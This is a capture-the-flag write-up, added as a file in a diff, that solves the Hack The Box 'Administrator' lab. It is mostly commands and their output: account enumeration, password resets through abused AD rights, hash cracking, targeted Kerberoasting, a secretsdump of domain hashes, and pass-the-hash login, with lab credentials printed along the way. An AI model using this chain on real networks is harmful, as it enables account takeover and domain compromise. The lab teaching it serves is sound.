@@ -1,0 +1,246 @@
+---
+title: Administrator
+date: '2025-01-06'
+description: ''
+type: writeup
+platform: hackthebox
+tags:
+  - ACTIVE MACHINE
+  - HTB
+  - LINUX
+  - MEDIUM
+cover: >-
+  /mc/uploads/2025/01/Adorable-Canine-Resting-on-Heavenly-Clouds-Background_2449052_wh1200.png
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+
+In this write-up, we will walk through the steps to hack the Administrator machine on Hack The Box. Let's dive in!
+
+## Initial Enumeration with Nmap
+
+We began by performing an **Nmap** scan to identify open ports and services on the target machine.
+
+```bash
+$ nmap -sV 10.10.11.42 -T5
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-06 14:09 EST
+Nmap scan report for administrator.htb (10.10.11.42)
+Host is up (0.050s latency).
+Not shown: 988 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-07 02:09:44Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.54 seconds
+```
+The scan revealed several open ports, including SMB (445), FTP (21), and LDAP (389). We also had credentials  
+for the user Olivia:ichliebedich , which we used for further enumeration.
+
+## Step 2: Enumeration Services
+
+Using **CrackMapExec**, we enumerated the SMB service to identify users and their roles.
+
+```bash
+$ crackmapexec smb 10.10.11.42 -u Olivia -p ichliebedich --rid-brute | grep "TypeUser"
+SMB                      10.10.11.42     445    DC               500: ADMINISTRATORAdministrator (SidTypeUser)
+SMB                      10.10.11.42     445    DC               501: ADMINISTRATORGuest (SidTypeUser)
+SMB                      10.10.11.42     445    DC               502: ADMINISTRATORkrbtgt (SidTypeUser)
+SMB                      10.10.11.42     445    DC               1000: ADMINISTRATORDC$ (SidTypeUser)
+SMB                      10.10.11.42     445    DC               1108: ADMINISTRATORolivia (SidTypeUser)
+SMB                      10.10.11.42     445    DC               1109: ADMINISTRATORmichael (SidTypeUser)
+SMB                      10.10.11.42     445    DC               1110: ADMINISTRATORbenjamin (SidTypeUser)
+SMB                      10.10.11.42     445    DC               1112: ADMINISTRATORemily (SidTypeUser)
+SMB                      10.10.11.42     445    DC               1113: ADMINISTRATORethan (SidTypeUser)
+SMB                      10.10.11.42     445    DC               3601: ADMINISTRATORalexander (SidTypeUser)
+SMB                      10.10.11.42     445    DC               3602: ADMINISTRATORemma (SidTypeUser)
+```
+Next, we checked if the Olivia account had access to WinRM.
+
+```bash
+crackmapexec winrm 10.10.11.42 -u Olivia -p ichliebedich  
+WINRM       10.10.11.42     5985   DC               [+] administrator.htbOlivia:ichliebedich (Pwn3d!)
+```
+The account had access, so we proceeded to use **BloodHound** for further  
+analysis.  
+We used **NetExec** to collect **BloodHound** data.
+
+```bash
+$ netexec ldap 10.10.11.42 -u olivia -p ichliebedich  --bloodhound --collection All --dns-server 10.10.11.42      
+SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
+LDAP        10.10.11.42     389    DC               [+] administrator.htbolivia:ichliebedich 
+LDAP        10.10.11.42     389    DC               Resolved collection methods: session, localadmin, rdp, trusts, container, objectprops, psremote, dcom, group, acl
+LDAP        10.10.11.42     389    DC               Done in 00M 10S
+LDAP        10.10.11.42     389    DC               Compressing output into /home/kali/.nxc/logs/DC_10.10.11.42_2025-01-06_142215_bloodhound.zip
+```
+## Step 3: bloodhound
+
+After importing the data into **BloodHound**, we discovered that Olivia had  
+**GenericAll** privileges over the Michael account. This allowed us to reset  
+Michael's password.
+
+[![](https://nutzh.top/wp-content/uploads/2025/01/image1-1.png)](https://nutzh.top/wp-content/uploads/2025/01/image1-1.png)Using **Evil-WinRM**, we connected to the Olivia account and reset Michael's  
+password.
+
+```bash
+$ *Evil-WinRM* PS C:UsersoliviaDocuments> Set-ADAccountPassword -Identity "MICHAEL" -NewPassword (ConvertTo-SecureString "NewPassword" -AsPlainText -Force) -Reset #to reset the pswd without knowing it
+```
+The new credentials for Michael were Michael:NewPassword .  
+Next, we analyzed Michael's privileges in **BloodHound** and found that he had  
+control over the Benjamin account. We repeated the process to reset  
+Benjamin's password.
+
+```bash
+$ *Evil-WinRM* PS C:UsersmichaelDocuments> Set-ADAccountPassword -Identity "BENJAMIN" -NewPassword (ConvertTo-SecureString "123456789" -AsPlainText -Force) -Reset
+```
+The new credentials for Benjamin were Benjamin:123456789.
+
+## Step 4: foothhold
+
+Using **CrackMapExec**, we discovered that Benjamin had access to the FTP  
+service.
+
+```bash
+crackmapexec ftp 10.10.11.42 -u Benjamin -p 123456789
+FTP         10.10.11.42     21     10.10.11.42      [*] Banner: Microsoft FTP Service
+FTP         10.10.11.42     21     10.10.11.42      [+] Benjamin:123456789
+```
+We logged into the FTP server and found a backup file named  
+Backup.psafe3. We downloaded it
+
+```bash
+ftp> get Backup.psafe3
+local: Backup.psafe3 remote: Backup.psafe3
+229 Entering Extended Passive Mode (|||53174|)
+125 Data connection already open; Transfer starting.
+100% |***************************************************************************************************|   952       18.73 KiB/s    00:00 ETA
+226 Transfer complete.
+WARNING! 3 bare linefeeds received in ASCII mode.
+File may not have transferred correctly.
+952 bytes received in 00:00 (18.65 KiB/s)
+```
+Using **pwsafe2john**, we extracted the hash from the backup file.
+
+```bash
+pwsafe2john Backup.psafe3
+backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050
+```
+We cracked the hash using **John the Ripper** and found the  
+password: tekieromucho.
+
+```bash
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (pwsafe, Password Safe [SHA256 128/128 SSE2 4x])
+Cost 1 (iteration count) is 2048 for all loaded hashes
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+tekieromucho     (?)     
+1g 0:00:00:00 DONE (2025-01-06 15:02) 2.702g/s 16605p/s 16605c/s 16605C/s adriano..iheartyou
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+After downloading the Backup.psafe3 file from the FTP server, we needed a tool to read its contents. The file was a Password Safe backup, which stores encrypted credentials. Unfortunately, Password Safe did not work on Linux, so we switched to a Windows environment to extract the data. To transfer the file from the Linux VM to a Windows machine, we used the SCP command. First, we ensured that the SSH service was enabled on the Linux VM. Then, we ran the following command in PowerShell on the Windows machine:
+
+```bash
+scp username@remote_ip:/path/to/remote/file "C:path\to\local\destination" #powershell
+```
+Once the file was transferred, we opened it using Password Safe on Windows.  
+The backup contained several entries, including credentials for Emily Rodriguez:
+
+```xml
+    <entry id="2">
+        <title><![CDATA[Emily Rodriguez]]></title>
+        <username><![CDATA[emily]]></username>
+        <password><![CDATA[UXLCI5iETUsIBoFVTj8yQFKoHjXmb]]></password>
+        <uuid><![CDATA[512230f10a83493b8fbdd46aa200bdcf]]></uuid>
+        <ctimex>2024-08-23T08:26:53</ctimex>
+    </entry>
+```
+Credentials Found:  
+Emily:**UXLCI5iETUsIBoFVTj8yQFKoHjXmb**
+
+With these credentials, we accessed the machine using **Evil-WinRM** and  
+retrieved the user flag.
+
+## Step 5: Privilege Escalation
+
+Using **BloodHound**, we analyzed the Active Directory relationships and  
+discovered that Emily had GenericWrite privileges over the Ethan account.  
+This meant we could modify Ethan's account properties, including setting  
+a **Service Principal Name** (SPN) for a Targeted Kerberoast attack.
+
+### Performing a Targeted Kerberoast Attack
+
+We used the targetedKerberoast.py script to perform the attack:
+
+```bash
+targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+[VERBOSE] SPN added successfully for (ethan)
+[+] Printing hash for (ethan)
+$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$5fa946f70a46bec63a74e142c3c36ebf$bdfda40bf8f91e77be2f3dde4434ce64cc6667f4a017571e3a082a2a7770e76786cd90fe0aec394b4c19c97dd1f115a3....
+[VERBOSE] SPN removed successfully for (ethan)
+```
+The script generated a Kerberos TGS ticket hash for the Ethan account.  
+We saved this hash to a file and used **John the Ripper** to crack it:
+
+```bash
+john ethanhash --wordlist=/usr/share/wordlists/rockyou.txt  
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+limpbizkit      (?)     
+1g 0:00:00:00 DONE (2025-01-06 21:53) 11.11g/s 68266p/s 68266c/s 68266C/s Liverpool..iheartyou
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+Cracked Password: Ethan:**limpbizkit**
+
+### Dumping Domain Hashes
+
+With Ethan's credentials, we used Impacket's secretsdump to extract  
+the NTLM hashes from the Domain Controller:
+
+```bash
+impacket-secretsdump administrator.htb/ETHAN:limpbizkit@10.10.11.42
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domainuid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce...::
+```
+Finally, we used the Administrator hash to gain access to the machine via **Evil-WinRM**:
+
+```bash
+evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce...
+```
+Once inside, we navigated to the Administrator's Desktop and retrieved the root flag:
+
+```bash
+*Evil-WinRM* PS C:UsersAdministratorDesktop> cat root.txt
+a5....
+```
+**GG!**
+
+## Conclusion
+
+This machine was an excellent exercise in Active Directory enumeration and privilege escalation. Key takeaways include:   
+**BloodHound** is an invaluable tool for visualizing Active Directory relationships and identifying misconfigurations. Targeted Kerberoasting is a powerful technique for escalating privileges by exploiting weak service account passwords.  
+**Impacket's secretsdump** is essential for extracting hashes and gaining domain administrator access. Thorough enumeration and understanding of Active Directory misconfigurations are critical for successful exploitation. This challenge reinforced the importance of persistence and creativity in penetration testing. By leveraging tools like **BloodHound**, **Impacket**, and **John the Ripper**, we were able to systematically escalate privileges and compromise the domain.
